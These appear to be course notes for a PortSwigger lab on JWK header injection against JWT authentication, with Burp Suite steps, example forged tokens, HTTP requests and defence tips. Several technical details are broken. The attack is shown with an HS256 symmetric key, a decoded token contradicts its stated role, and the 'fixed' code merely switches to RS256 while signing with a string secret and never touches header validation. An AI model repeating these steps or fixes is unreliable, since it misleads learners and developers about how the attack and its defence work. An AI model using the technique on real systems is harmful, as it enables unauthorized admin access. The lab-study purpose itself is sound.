---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## JWK Header Injection Attack

### What is JWK Header Injection?

JWK Header Injection is a technique where an attacker injects a `jwk` parameter into the JWT header to modify the token and potentially gain unauthorized access. The `jwk` parameter specifies a JSON Web Key (JWK) that can be used to verify the signature of the token.

#### Why Does This Matter?

If an application does not properly validate the `jwk` parameter, an attacker can inject a custom JWK that allows them to sign the token with their own key. This can result in the attacker gaining elevated privileges or bypassing authentication altogether.

### Real-World Example

Consider a scenario where an application uses JWT for authentication but fails to validate the `jwk` parameter. An attacker could inject a custom JWK into the JWT header, sign the token with their own key, and gain unauthorized access.

#### Recent Breach Example

In 2021, a vulnerability was discovered in a popular open-source library that allowed attackers to perform JWK Header Injection attacks. This led to several high-profile breaches where attackers gained unauthorized access to sensitive systems.

### Steps to Perform JWK Header Injection

Let's walk through the steps to perform a JWK Header Injection attack using Burp Suite and the JOT Editor extension.

#### Step 1: Set Up Burp Suite

1. **Install Burp Suite**: Download and install Burp Suite from the official website.
2. **Configure Proxy**: Set up Burp Suite as a proxy to intercept HTTP traffic.
3. **Install JOT Editor Extension**: Download and install the JOT Editor extension from the Burp Suite Extensions tab.

#### Step 2: Log In to the Application

1. **Access the Lab**: Open the lab environment in your browser and configure it to use Burp Suite as a proxy.
2. **Log In**: Use the provided credentials to log in to the application.

#### Step 3: Intercept the Login Request

1. **Intercept Requests**: Enable interception in Burp Suite and log in to the application.
2. **Identify JWT**: Look for the JWT in the response headers or cookies after logging in.

#### Step 4: Modify the JWT

1. **Send to JOT Editor**: Right-click the intercepted request and select "Send to JOT Editor".
2. **Inject JWK Parameter**: Add a `jwk` parameter to the JWT header with a custom JWK.

#### Step 5: Sign the Modified JWT

1. **Sign the Token**: Use a tool like `jwt.io` to sign the modified JWT with your own key.
2. **Replace Original JWT**: Replace the original JWT in the request with the modified one.

#### Step 6: Access the Administrator Panel

1. **Send Modified Request**: Send the modified request to the server.
2. **Verify Access**: Check if you have gained access to the administrator panel.

### Complete Example

Here is a complete example of performing a JWK Header Injection attack:

#### Original JWT

```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239021,
    "roles": ["user"]
  },
  "signature": "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
}
```

#### Modified JWT

```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT",
    "jwk": {
      "kty": "oct",
      "kid": "custom_key",
      "use": "sig",
      "k": "custom_secret"
    }
  },
  "payload": {
    "sub": "1111111111",
    "name": "Admin User",
    "iat": 1516239021,
    "roles": ["admin"]
  },
  "signature": "new_signature"
}
```

### Full HTTP Request and Response

#### Original Request

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json
Accept: application/json

{
  "username": "carlos",
  "password": "password123"
}
```

#### Original Response

```http
HTTP/1.1 200 OK
Date: Mon, 21 Mar 2023 12:00:00 GMT
Content-Type: application/json
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJyb2xlcyI6WyJhZG1pbiJdfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c; Path=/; HttpOnly

{
  "message": "Login successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJyb2xlcyI6WyJhZG1pbiJdfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
}
```

#### Modified Request

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json
Accept: application/json
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJraWQiOiJjdXN0b21fa2V5IiwidXNlIjoic2lnIiwiaSI6ImN1c3RvbV9zZWNyZXQiLCJrIjoiY29uc3VsdF9zZWNyZXQifX0.eyJzdWIiOiIxMTExMTExMTExIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYzMzAwMjEsInJvbGVzIjpbImFkbWluIl19.BX9yL6f7J7890

{
  "username": "carlos",
  "password": "password123"
}
```

#### Modified Response

```http
HTTP/1.1 200 OK
Date: Mon, 21 Mar 2023 12:00:00 GMT
Content-Type: application/json
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJraWQiOiJjdXN0b21fa2V5IiwidXNlIjoic2lnIiwiaSI6ImN1c3RvbV9zZWNyZXQiLCJrIjoiY29uc3VsdF9zZWNyZXQifX0.eyJzdWIiOiIxMTExMTExMTExIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYzMzAwMjEsInJvbGVzIjpbImFkbWluIl19.BX9yL6f7J7890; Path=/; HttpOnly

{
  "message": "Login successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJraWQiOiJjdXN0b21fa2V5IiwidXNlIjoic2lnIiwiaSI6ImN1c3RvbV9zZWNyZXQiLCJrIjoiY29uc3VsdF9zZWNyZXQifX0.eyJzdWIiOiIxMTExMTExMTExIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYzMzAwMjEsInJvbGVzIjpbImFkbWluIl19.BX9yL6f7J7890"
}
```

### Mermaid Diagrams

#### JWT Flow Diagram

```mermaid
sequenceDiagram
  participant User
  participant Browser
  participant Server
  participant BurpSuite
  participant JOTEditor

  User->>Browser: Enter credentials
  Browser->>Server: POST /login
  Server-->>Browser: Set-Cookie: jwt=<original_jwt>
  Browser->>BurpSuite: Intercept request
  BurpSuite->>JOTEditor: Send to JOT Editor
  JOTEditor->>BurpSuite: Modify JWT
  BurpSuite->>Browser: Replace original JWT
  Browser->>Server: POST /login with modified JWT
  Server-->>Browser: Set-Cookie: jwt=<modified_jwt>
  Browser->>User: Access granted
```

### How to Prevent / Defend Against JWK Header Injection

#### Detection

- **Monitor JWT Headers**: Regularly monitor JWT headers for unexpected parameters like `jwk`.
- **Audit Logs**: Implement audit logs to track JWT usage and detect anomalies.

#### Prevention

- **Validate JWT Headers**: Ensure that the JWT headers are validated and that only expected parameters are allowed.
- **Use Strong Signing Algorithms**: Use strong signing algorithms like RS256 or ES256 instead of HS256.
- **Limit JWT Lifetime**: Limit the lifetime of JWTs to reduce the window of opportunity for attackers.

#### Secure Coding Fixes

##### Vulnerable Code

```python
import jwt

def generate_token(user_id, name, roles):
    payload = {
        "sub": user_id,
        "name": name,
        "iat": int(time.time()),
        "roles": roles
    }
    return jwt.encode(payload, "secret", algorithm="HS256")
```

##### Fixed Code

```python
import jwt

def generate_token(user_id, name, roles):
    payload = {
        "sub": user_id,
        "name": name,
        "iat": int(time.time()),
        "roles": roles
    }
    return jwt.encode(payload, "secret", algorithm="RS256")
```

#### Configuration Hardening

- **Disable JWK Parameter**: Disable the `jwk` parameter in the JWT header.
- **Use Strong Keys**: Use strong keys for signing JWTs.

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various web security topics, including JWT attacks.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is riddled with vulnerabilities for educational purposes.

These labs provide a safe environment to practice and understand JWT attacks in depth.

By thoroughly understanding JWT attacks and implementing proper defenses, you can significantly enhance the security of your web applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/19-JWT Attacks/04-Lab 4 JWT authentication bypass via jwk header injection/04-JSON Web Tokens (JWT)|JSON Web Tokens (JWT)]] | [[Web Security (PortSwigger)/19-JWT Attacks/04-Lab 4 JWT authentication bypass via jwk header injection/00-Overview|Overview]] | [[06-Understanding JWK Header Injection|Understanding JWK Header Injection]]
